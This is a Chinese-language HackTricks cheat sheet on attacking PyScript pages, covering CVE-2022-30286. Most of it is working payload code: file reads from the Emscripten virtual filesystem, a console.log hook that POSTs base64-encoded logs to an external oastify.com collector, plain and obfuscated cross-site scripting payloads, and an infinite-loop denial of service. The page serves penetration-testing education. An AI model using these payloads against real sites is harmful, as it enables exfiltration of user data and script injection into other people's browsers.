# Pyscript

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## PyScript渗透测试指南

PyScript是一个新的框架，用于将Python集成到HTML中，以便与HTML一起使用。在这份速查表中，您将了解如何使用PyScript进行渗透测试。

### 从Emscripten虚拟内存文件系统中转储/检索文件：

`CVE ID: CVE-2022-30286`\
\
代码:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin:
out = fin.read()
print(out)
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten虚拟内存文件系统的OOB数据泄露（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/\~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Code:
```html
<py-script>
x = "CyberGuy"
if x == "CyberGuy":
with open('/lib/python3.10/asyncio/tasks.py') as output:
contents = output.read()
print(contents)
print('<script>console.pylog = console.log; console.logs = []; console.log = function(){     console.logs.push(Array.from(arguments));     console.pylog.apply(console, arguments);fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {method: "POST",headers: {"Content-Type": "text/plain;charset=utf-8"},body: JSON.stringify({"content": btoa(console.logs)})});}</script>')
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### 跨站脚本（普通）

代码：
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### 跨站脚本（Python混淆）

代码：
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### 跨站脚本（JavaScript混淆）

代码：
```html
<py-script>
prinht("<script>var _0x3675bf=_0x5cf5;function _0x5cf5(_0xced4e9,_0x1ae724){var _0x599cad=_0x599c();return _0x5cf5=function(_0x5cf5d2,_0x6f919d){_0x5cf5d2=_0x5cf5d2-0x94;var _0x14caa7=_0x599cad[_0x5cf5d2];return _0x14caa7;},_0x5cf5(_0xced4e9,_0x1ae724);}(function(_0x5ad362,_0x98a567){var _0x459bc5=_0x5cf5,_0x454121=_0x5ad362();while(!![]){try{var _0x168170=-parseInt(_0x459bc5(0x9e))/0x1*(parseInt(_0x459bc5(0x95))/0x2)+parseInt(_0x459bc5(0x97))/0x3*(-parseInt(_0x459bc5(0x9c))/0x4)+-parseInt(_0x459bc5(0x99))/0x5+-parseInt(_0x459bc5(0x9f))/0x6*(parseInt(_0x459bc5(0x9d))/0x7)+-parseInt(_0x459bc5(0x9b))/0x8*(-parseInt(_0x459bc5(0x9a))/0x9)+-parseInt(_0x459bc5(0x94))/0xa+parseInt(_0x459bc5(0x98))/0xb*(parseInt(_0x459bc5(0x96))/0xc);if(_0x168170===_0x98a567)break;else _0x454121['push'](_0x454121['shift']());}catch(_0x5baa73){_0x454121['push'](_0x454121['shift']());}}}(_0x599c,0x28895),prompt(document[_0x3675bf(0xa0)]));function _0x599c(){var _0x34a15f=['15170376Sgmhnu','589203pPKatg','11BaafMZ','445905MAsUXq','432bhVZQo','14792bfmdlY','4FKyEje','92890jvCozd','36031bizdfX','114QrRNWp','domain','3249220MUVofX','18cpppdr'];_0x599c=function(){return _0x34a15f;};return _0x599c();}</script>")
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS 攻击（无限循环）

代码：
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
结果：

![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
